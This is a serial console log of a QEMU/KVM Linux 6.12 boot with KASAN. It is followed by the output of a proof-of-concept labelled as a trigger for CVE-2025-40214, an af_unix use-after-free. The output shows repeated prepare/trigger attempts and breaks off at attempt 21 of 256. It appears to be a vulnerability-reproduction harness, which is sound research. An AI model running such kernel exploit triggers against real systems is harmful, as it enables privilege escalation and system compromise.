bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004fd62c4
input_len: 0x0000000001b49d39
output: 0x0000000001000000
output_len: 0x0000000005aa4d9c
kernel_total_size: 0x0000000005630000
needed_size: 0x0000000005c00000
trampoline_32bit: 0x0000000000000000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.12.0-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Mon May 18 07:33:54 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: legacy bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000052] kvm-clock: using sched offset of 921512162 cycles
[    0.001747] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.008473] tsc: Detected 2995.200 MHz processor
[    0.014130] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.018133] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.022620] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.031206] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.033450] Using GB pages for direct mapping
[    0.034924] Incomplete global flushes, disabling PCID
[    0.035250] RAMDISK: [mem 0x7fe86000-0x7ffdffff]
[    0.039824] ACPI: Early table checksum verification disabled
[    0.042269] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.046308] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.050877] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.055406] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.058531] ACPI: FACS 0x000000007FFE0000 000040
[    0.059847] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.062210] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.067159] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.070864] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.074625] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.077628] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.081392] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.085105] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.090035] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.095128] No NUMA configuration found
[    0.097636] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.101784] NODE_DATA(0) allocated [mem 0x7fe82940-0x7fe85fff]
[    0.104641] Zone ranges:
[    0.105498]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.107449]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.109503]   Normal   empty
[    0.110676] Movable zone start for each node
[    0.112021] Early memory node ranges
[    0.113153]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.115005]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.118401] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.123091] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.126443] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.164020] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.370816] kasan: KernelAddressSanitizer initialized
[    0.373591] ACPI: PM-Timer IO Port: 0x608
[    0.374904] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.376461] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.380212] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.383515] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.387300] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.389976] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.392231] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.394244] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.396678] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.398453] TSC deadline timer available
[    0.399773] CPU topo: Max. logical packages:   1
[    0.402417] CPU topo: Max. logical dies:       1
[    0.405094] CPU topo: Max. dies per package:   1
[    0.407678] CPU topo: Max. threads per core:   1
[    0.409427] CPU topo: Num. cores per package:     2
[    0.411909] CPU topo: Num. threads per package:   2
[    0.413966] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.416561] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.421874] kvm-guest: KVM setup pv remote TLB flush
[    0.423955] kvm-guest: setup PV sched yield
[    0.425410] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.428461] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.431107] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.434261] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.438292] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.440731] Booting paravirtualized kernel on KVM
[    0.443444] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.466654] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.472672] percpu: Embedded 68 pages/cpu s241496 r8192 d28840 u1048576
[    0.478247] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.483961] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.488202] random: crng init done
[    0.489641] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.492966] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.496232] Fallback order for Node 0: 0 
[    0.496328] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.499362] Policy zone: DMA32
[    0.500441] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.502453] stackdepot: allocating hash table via alloc_large_system_hash
[    0.504304] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.628660] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.643312] Dynamic Preempt: voluntary
[    0.646760] rcu: Preemptible hierarchical RCU implementation.
[    0.649843] rcu: 	RCU event tracing is enabled.
[    0.652007] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.655107] 	Trampoline variant of Tasks RCU enabled.
[    0.668727] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.678337] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.683562] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.776469] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.780111] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.797811] Console: colour VGA+ 80x25
[    0.801456] printk: legacy console [ttyS0] enabled
[    0.801456] printk: legacy console [ttyS0] enabled
[    0.804664] printk: legacy bootconsole [earlyser0] disabled
[    0.804664] printk: legacy bootconsole [earlyser0] disabled
[    0.808198] ACPI: Core revision 20240827
[    0.812371] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.816847] APIC: Switch to symmetric I/O mode setup
[    0.818727] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.821505] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.825042] kvm-guest: setup PV IPIs
[    0.838271] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.843655] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    0.852158] Calibrating delay loop (skipped) preset value.. 5990.40 BogoMIPS (lpj=2995200)
[    0.863395] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.871348] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.872129] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.873100] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.873100] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.873100] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.873100] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.873100] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.873100] RETBleed: Mitigation: Enhanced IBRS
[    0.873100] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.873100] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.873100] MMIO Stale Data: Unknown: No mitigations
[    0.873100] Register File Data Sampling: Vulnerable: No microcode
[    0.875391] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.877308] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.886704] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.891274] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.893321] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.969485] Freeing SMP alternatives memory: 48K
[    0.971402] pid_max: default: 32768 minimum: 301
[    0.979970] LSM: initializing lsm=capability,selinux
[    0.983292] SELinux:  Initializing.
[    0.997247] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.998241] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    1.001497] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    1.002710] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    1.003353] signal: max sigframe size: 1776
[    1.004470] rcu: Hierarchical SRCU implementation.
[    1.005108] rcu: 	Max phase no-delay instances is 400.
[    1.006233] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    1.029100] smp: Bringing up secondary CPUs ...
[    1.032351] smpboot: x86: Booting SMP configuration:
[    1.033386] .... node  #0, CPUs:      #1
[    1.039098] smp: Brought up 1 node, 2 CPUs
[    1.041203] smpboot: Total of 2 processors activated (11980.80 BogoMIPS)
[    1.043052] Memory: 1675360K/2096632K available (51200K kernel code, 8607K rwdata, 11112K rodata, 5956K init, 1596K bss, 416232K reserved, 0K cma-reserved)
[    1.064500] devtmpfs: initialized
[    1.076471] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    1.077243] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    1.079618] PM: RTC time: 07:34:43, date: 2026-05-18
[    1.080597] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    1.081473] audit: initializing netlink subsys (disabled)
[    1.082832] audit: type=2000 audit(1779089683.701:1): state=initialized audit_enabled=0 res=1
[    1.082832] thermal_sys: Registered thermal governor 'step_wise'
[    1.083111] thermal_sys: Registered thermal governor 'user_space'
[    1.084112] cpuidle: using governor menu
[    1.086516] PCI: Using configuration type 1 for base access
[    1.093338] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    1.098380] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    1.101117] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    1.104253] ACPI: Added _OSI(Module Device)
[    1.106468] ACPI: Added _OSI(Processor Device)
[    1.107112] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.108108] ACPI: Added _OSI(Processor Aggregator Device)
[    1.122478] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.135100] ACPI: Interpreter enabled
[    1.137206] ACPI: PM: (supports S0 S3 S4 S5)
[    1.138108] ACPI: Using IOAPIC for interrupt routing
[    1.139208] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.141108] PCI: Using E820 reservations for host bridge windows
[    1.143611] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.163561] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.166141] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.169114] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    1.171209] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    1.174383] PCI host bridge to bus 0000:00
[    1.176146] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.178124] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.180159] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.183129] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    1.189128] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    1.191114] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.193217] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    1.205500] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    1.214278] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    1.220130] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    1.221925] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    1.224111] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    1.225175] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    1.227178] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    1.230419] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    1.234155] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.236126] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.238647] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    1.242756] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    1.246740] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    1.254558] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    1.257465] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.265100] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    1.268112] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    1.271029] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    1.275803] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    1.287052] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.289693] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.293667] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.296660] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.298355] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.300616] iommu: Default domain type: Translated
[    1.301100] iommu: DMA domain TLB invalidation policy: lazy mode
[    1.303456] SCSI subsystem initialized
[    1.306427] ACPI: bus type USB registered
[    1.307228] usbcore: registered new interface driver usbfs
[    1.308157] usbcore: registered new interface driver hub
[    1.309145] usbcore: registered new device driver usb
[    1.310202] pps_core: LinuxPPS API ver. 1 registered
[    1.311111] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.312131] PTP clock support registered
[    1.314163] Advanced Linux Sound Architecture Driver Initialized.
[    1.315829] NetLabel: Initializing
[    1.316109] NetLabel:  domain hash size = 128
[    1.317107] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.318168] NetLabel:  unlabeled traffic allowed by default
[    1.319209] PCI: Using ACPI for IRQ routing
[    1.320451] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.321100] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.321100] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.321111] vgaarb: loaded
[    1.322249] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.323113] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.328231] clocksource: Switched to clocksource kvm-clock
[    1.331956] VFS: Disk quotas dquot_6.6.0
[    1.333133] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.335862] pnp: PnP ACPI init
[    1.338511] pnp: PnP ACPI: found 6 devices
[    1.354504] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.358230] NET: Registered PF_INET protocol family
[    1.359808] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.362449] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    1.364934] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    1.367864] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    1.370440] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    1.375904] TCP: Hash tables configured (established 16384 bind 16384)
[    1.377886] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.379665] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.381849] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    1.385059] RPC: Registered named UNIX socket transport module.
[    1.386984] RPC: Registered udp transport module.
[    1.388232] RPC: Registered tcp transport module.
[    1.389470] RPC: Registered tcp-with-tls transport module.
[    1.390896] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.393523] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.394979] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.396612] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    1.398369] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    1.400261] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    1.402332] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    1.403602] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    1.405995] PCI: CLS 0 bytes, default 64
[    1.407810] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    1.407904] Unpacking initramfs...
[    1.410498] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    1.417362] Initialise system trusted keyrings
[    1.418827] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    1.421377] NFS: Registering the id_resolver key type
[    1.422832] Key type id_resolver registered
[    1.423984] Key type id_legacy registered
[    1.425547] 9p: Installing v9fs 9p2000 file system support
[    1.434803] Freeing initrd memory: 1384K
[    1.437288] Key type asymmetric registered
[    1.438380] Asymmetric key parser 'x509' registered
[    1.439686] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    1.442139] io scheduler mq-deadline registered
[    1.443567] io scheduler kyber registered
[    1.445226] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.447857] ACPI: button: Power Button [PWRF]
[    1.449957] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    1.452280] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.455742] Non-volatile memory driver v1.3
[    1.456935] Linux agpgart interface v0.103
[    1.458239] ACPI: bus type drm_connector registered
[    1.464446] loop: module loaded
[    1.468514] scsi host0: ata_piix
[    1.472032] scsi host1: ata_piix
[    1.473250] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    1.475551] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    1.479052] e100: Intel(R) PRO/100 Network Driver
[    1.481877] e100: Copyright(c) 1999-2006 Intel Corporation
[    1.484350] e1000: Intel(R) PRO/1000 Network Driver
[    1.486206] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.632572] ata2: found unknown device (class 0)
[    1.634712] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.639348] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.668261] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.669932] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.682834] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    1.936549] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    2.347992] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    2.351018] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    2.352688] e1000e: Intel(R) PRO/1000 Network Driver
[    2.353932] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    2.355353] sky2: driver version 1.30
[    2.358526] usbcore: registered new interface driver usblp
[    2.361006] usbcore: registered new interface driver usb-storage
[    2.362996] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    2.367735] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.369070] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.371365] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    2.373592] rtc_cmos 00:05: RTC can wake from S4
[    2.376835] rtc_cmos 00:05: registered as rtc0
[    2.378200] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    2.382212] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@lists.linux.dev
[    2.384476] intel_pstate: CPU model not supported
[    2.385611] hid: raw HID events driver (C) Jiri Kosina
[    2.388257] usbcore: registered new interface driver usbhid
[    2.389983] usbhid: USB HID core driver
[    2.394525] Initializing XFRM netlink socket
[    2.395831] NET: Registered PF_INET6 protocol family
[    2.398192] Segment Routing with IPv6
[    2.399125] In-situ OAM (IOAM) with IPv6
[    2.400144] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    2.401923] NET: Registered PF_PACKET protocol family
[    2.403201] 9pnet: Installing 9P2000 support
[    2.404291] Key type dns_resolver registered
[    2.407711] IPI shorthand broadcast: enabled
[    2.422494] sched_clock: Marking stable (2364300806, 58165826)->(2627094437, -204627805)
[    2.427986] registered taskstats version 1
[    2.429086] Loading compiled-in X.509 certificates
[    2.440038] Demotion targets for Node 0: null
[    2.441457] PM:   Magic number: 10:117:572
[    2.442855] printk: legacy console [netcon0] enabled
[    2.444353] netconsole: network logging started
[    2.447114] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    2.449785] kworker/u8:1 (55) used greatest stack depth: 29664 bytes left
[    2.451449] kworker/u8:1 (56) used greatest stack depth: 29488 bytes left
[    2.451725] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    2.457704] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    2.459618] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    2.460242] ALSA device list:
[    2.463864] cfg80211: failed to load regulatory.db
[    2.464468]   No soundcards found.
[    2.469679] Freeing unused kernel image (initmem) memory: 5956K
[    2.470434] Write protecting the kernel read-only data: 63488k
[    2.471615] Freeing unused kernel image (rodata/data gap) memory: 1176K
[    2.482303] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.483549] Run /init as init process
[    2.488576] mkdir (58) used greatest stack depth: 28840 bytes left
[    2.490347] mount (59) used greatest stack depth: 28304 bytes left

secb: rootfs ready
---- poc begin ----
[*] CVE-2025-40214 trigger (af_unix scc_index uninit -> recv-queue UAF)
[*] userns + RLIMIT_NOFILE configured
[*] gc-trigger thread up on CPU 1
[*] attempt 1/256: prepare_uaf
[*] attempt 1/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 1/256: trigger_uaf -> 0
[*] attempt 2/256: prepare_uaf
[*] attempt 2/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 2/256: trigger_uaf -> 0
[*] attempt 3/256: prepare_uaf
[*] attempt 3/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 3/256: trigger_uaf -> 0
[*] attempt 4/256: prepare_uaf
[*] attempt 4/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 4/256: trigger_uaf -> 0
[*] attempt 5/256: prepare_uaf
[*] attempt 5/256: trigger_uaf (close B, GC, recvfds C)
[    2.811641] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[*] attempt 5/256: trigger_uaf -> 0
[*] attempt 6/256: prepare_uaf
[*] attempt 6/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 6/256: trigger_uaf -> 0
[*] attempt 7/256: prepare_uaf
[*] attempt 7/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 7/256: trigger_uaf -> 0
[*] attempt 8/256: prepare_uaf
[*] attempt 8/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 8/256: trigger_uaf -> 0
[*] attempt 9/256: prepare_uaf
[*] attempt 9/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 9/256: trigger_uaf -> 0
[*] attempt 10/256: prepare_uaf
[*] attempt 10/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 10/256: trigger_uaf -> 0
[*] attempt 11/256: prepare_uaf
[*] attempt 11/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 11/256: trigger_uaf -> 0
[*] attempt 12/256: prepare_uaf
[*] attempt 12/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 12/256: trigger_uaf -> 0
[*] attempt 13/256: prepare_uaf
[*] attempt 13/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 13/256: trigger_uaf -> 0
[*] attempt 14/256: prepare_uaf
[*] attempt 14/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 14/256: trigger_uaf -> 0
[*] attempt 15/256: prepare_uaf
[*] attempt 15/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 15/256: trigger_uaf -> 0
[*] attempt 16/256: prepare_uaf
[*] attempt 16/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 16/256: trigger_uaf -> 0
[*] attempt 17/256: prepare_uaf
[*] attempt 17/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 17/256: trigger_uaf -> 0
[*] attempt 18/256: prepare_uaf
[*] attempt 18/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 18/256: trigger_uaf -> 0
[*] attempt 19/256: prepare_uaf
[*] attempt 19/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 19/256: trigger_uaf -> 0
[*] attempt 20/256: prepare_uaf
[*] attempt 20/256: trigger_uaf (close B, GC, recvfds C)
[*] attempt 20/256: trigger_uaf -> 0
[*] attempt 21/256: prepare_uaf
[*] attempt 21/256: trigger_uaf (close B, GC, recvfds C)
